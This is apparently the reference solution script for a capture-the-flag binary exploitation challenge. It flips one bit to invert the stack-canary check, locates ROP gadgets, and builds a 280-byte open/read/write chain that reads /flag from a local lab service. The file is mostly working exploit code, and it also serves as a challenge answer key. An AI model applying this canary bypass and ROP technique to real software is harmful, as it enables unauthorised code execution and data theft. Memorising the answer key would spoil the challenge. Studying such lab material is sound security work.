#!/usr/bin/env bash
# Reference solution for the bit-challenge — local.
#
#   ./solve/solve.sh
#
# The 1-bit primitive is the canary check at the end of main:
#
#     mov rdx, [rbp-0x8]            ; saved canary
#     sub rdx, fs:0x28              ; xor against TLS canary
#     je  canary_ok    <-- 74 XX    ; flip bit 0 to 75 (jne) and the
#     call __stack_chk_fail          ; check inverts: corrupted canary
#   canary_ok:                       ; now takes the jump
#     leave; ret
#
# After the canary is bypassed, exploitation is a full open/read/write
# syscall ROP chain. The binary contains no shell helpers — no system,
# no /bin/sh — only "/flag" anchored in .rodata. The author also dropped
# `pop rdi/rsi/rdx ; ret` gadgets into .text via inline asm, because
# modern static glibc on Ubuntu 24.04 has zero clean rdx-control
# gadgets and ORW would otherwise be unbuildable.
#
# Layout (280 bytes; the read window is 512 so the rest is slack):
#
#   88  filler 'A's            (overruns buf, gap, canary, saved rbp)
#  ---- open("/flag", 0) ----
#   16  pop_rdi_ret + &flag
#   16  pop_rsi_ret + 0          (O_RDONLY)
#   16  pop_rax_ret + 2          (SYS_open)
#    8  syscall_ret              -> rax = fd (3)
#  ---- read(3, &bss, 64) ----
#   16  pop_rdi_ret + 3
#   16  pop_rsi_ret + &bss
#   16  pop_rdx_ret + 64
#   16  pop_rax_ret + 0          (SYS_read)
#    8  syscall_ret
#  ---- write(1, &bss, 64) ----  (rsi/rdx carry over from read)
#   16  pop_rdi_ret + 1
#   16  pop_rax_ret + 1          (SYS_write)
#    8  syscall_ret
#  ---- exit(0) ----              (must terminate cleanly — without this,
#   16  pop_rax_ret + 60          ret pops a stale main-pointer from
#    8  syscall_ret               __libc_start_main's frame and main is
#                                 re-entered with a valid canary, which
#                                 the patched jne now FAILS on. Boom.)

set -euo pipefail

cd "$(dirname "$0")/../service"

dbg=bit.dbg
bin=bit
if [[ ! -f $dbg || src/echo.c -nt $dbg ]]; then
    make -C src
    cp src/$bin $bin
    cp src/$dbg $dbg
fi

python3 - <<'PY'
import re, struct, subprocess, sys
from elftools.elf.elffile import ELFFile

p = lambda x: struct.pack("<Q", x)

# --- collect everything we need from bit.dbg ------------------------
text_vaddr = text_foff = text_size = None
ro_vaddr = ro_foff = ro_size = None
bss_vaddr = None
syms = {}
with open("bit.dbg", "rb") as f:
    elf = ELFFile(f)
    for sec in elf.iter_sections():
        if sec.name == ".text":
            text_vaddr = sec["sh_addr"]
            text_foff  = sec["sh_offset"]
            text_size  = sec["sh_size"]
        elif sec.name == ".rodata":
            ro_vaddr = sec["sh_addr"]
            ro_foff  = sec["sh_offset"]
            ro_size  = sec["sh_size"]
        elif sec.name == ".bss":
            bss_vaddr = sec["sh_addr"]
        elif sec.name == ".symtab":
            for s in sec.iter_symbols():
                if s.name == "main":
                    syms[s.name] = s["st_value"]
    f.seek(0)
    full = f.read()

# /flag string lives in .rodata
i = full.find(b"/flag\x00", ro_foff, ro_foff + ro_size)
assert i >= 0, "/flag not found in .rodata"
flag_vaddr = ro_vaddr + (i - ro_foff)

# --- find the canary `je` in main -----------------------------------
dis = subprocess.check_output(
    ["objdump", "-d", "--disassemble=main", "-M", "intel", "bit.dbg"]
).decode()
lines = dis.splitlines()
canary_je_vaddr = None
for i, ln in enumerate(lines):
    if re.search(r"sub\s+rdx,QWORD PTR fs:0x28", ln):
        for j in range(i + 1, min(i + 6, len(lines))):
            m = re.match(r"^\s*([0-9a-f]+):\s*74\s", lines[j])
            if m:
                canary_je_vaddr = int(m.group(1), 16)
                break
        break
assert canary_je_vaddr is not None, "couldn't find canary `je`"
je_foff   = canary_je_vaddr - text_vaddr + text_foff
PATCH_BIT_OFFSET = je_foff * 8 + 0       # bit 0 of 0x74 -> 0x75 (jne)

# --- find ROP gadgets ----------------------------------------------
def find(pat):
    off = full.find(pat, text_foff, text_foff + text_size)
    return None if off < 0 else off - text_foff + text_vaddr

g_pop_rdi = find(b"\x5f\xc3")           # anchored
g_pop_rsi = find(b"\x5e\xc3")           # anchored
g_pop_rdx = find(b"\x5a\xc3")           # anchored
g_pop_rax = find(b"\x58\xc3")           # already in glibc
g_syscall = find(b"\x0f\x05\xc3")       # already in glibc
for name, val in [("pop rdi;ret",g_pop_rdi),("pop rsi;ret",g_pop_rsi),
                  ("pop rdx;ret",g_pop_rdx),("pop rax;ret",g_pop_rax),
                  ("syscall;ret",g_syscall)]:
    assert val is not None, f"missing gadget: {name}"

# --- a writable, fixed-address buffer for the read syscall ----------
bss_buf = bss_vaddr + 0x200             # well clear of any glibc-owned slots

print(f"main          = 0x{syms['main']:x}",      file=sys.stderr)
print(f"/flag         = 0x{flag_vaddr:x}",        file=sys.stderr)
print(f".bss buffer   = 0x{bss_buf:x}",           file=sys.stderr)
print(f"pop rdi;ret   = 0x{g_pop_rdi:x}",         file=sys.stderr)
print(f"pop rsi;ret   = 0x{g_pop_rsi:x}",         file=sys.stderr)
print(f"pop rdx;ret   = 0x{g_pop_rdx:x}",         file=sys.stderr)
print(f"pop rax;ret   = 0x{g_pop_rax:x}",         file=sys.stderr)
print(f"syscall;ret   = 0x{g_syscall:x}",         file=sys.stderr)
print(f"canary je @   = 0x{canary_je_vaddr:x} (foff {je_foff:#x})", file=sys.stderr)
print(f"patch bit off = {PATCH_BIT_OFFSET} (0x{PATCH_BIT_OFFSET:x})", file=sys.stderr)

# --- the ORW chain --------------------------------------------------
READ_LEN = 64

filler = b"A" * 88
chain  = b""
# open("/flag", O_RDONLY)
chain += p(g_pop_rdi) + p(flag_vaddr)
chain += p(g_pop_rsi) + p(0)
chain += p(g_pop_rax) + p(2)            # SYS_open
chain += p(g_syscall)
# read(3, &bss_buf, 64)
chain += p(g_pop_rdi) + p(3)
chain += p(g_pop_rsi) + p(bss_buf)
chain += p(g_pop_rdx) + p(READ_LEN)
chain += p(g_pop_rax) + p(0)            # SYS_read
chain += p(g_syscall)
# write(1, &bss_buf, 64) — rsi and rdx still set from the read above
chain += p(g_pop_rdi) + p(1)
chain += p(g_pop_rax) + p(1)            # SYS_write
chain += p(g_syscall)
# exit(0)
chain += p(g_pop_rax) + p(60)           # SYS_exit
chain += p(g_syscall)

payload = filler + chain
assert len(payload) == 280, f"payload is {len(payload)} bytes, expected 280"

# --- drive run.py with salt=00000000 (XOR identity) -----------------
r = subprocess.run(
    ["./run.py", "--salt", "00000000",
     "--patch", str(PATCH_BIT_OFFSET)],
    input=payload,
    capture_output=True, timeout=15,
)
sys.stdout.buffer.write(r.stdout)
if r.stderr:
    sys.stderr.buffer.write(r.stderr)
print(f"--- run.py exit {r.returncode} ---", file=sys.stderr)
PY
